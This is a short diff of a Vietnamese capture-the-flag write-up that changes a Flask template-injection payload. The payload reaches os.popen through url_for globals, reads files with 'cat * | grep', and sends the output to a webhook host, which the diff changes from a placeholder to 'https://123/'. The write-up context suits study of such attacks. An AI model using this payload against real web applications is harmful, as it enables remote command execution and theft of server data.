@@ -34,6 +34,6 @@
 - Cách làm là ta sẽ tìm cách chuyển kết quả của câu lệnh sang trang webhook
 - Payload:
   ```
-  url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('url_webhook_here/?flag=' + url_for.__globals__['os'].popen('cat * | grep \"ISIT\"').read())
+  url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://123/?flag=' + url_for.__globals__['os'].popen('cat * | grep \"ISIT\"').read())
   ```
 - Flag sẽ được in ra ở respone
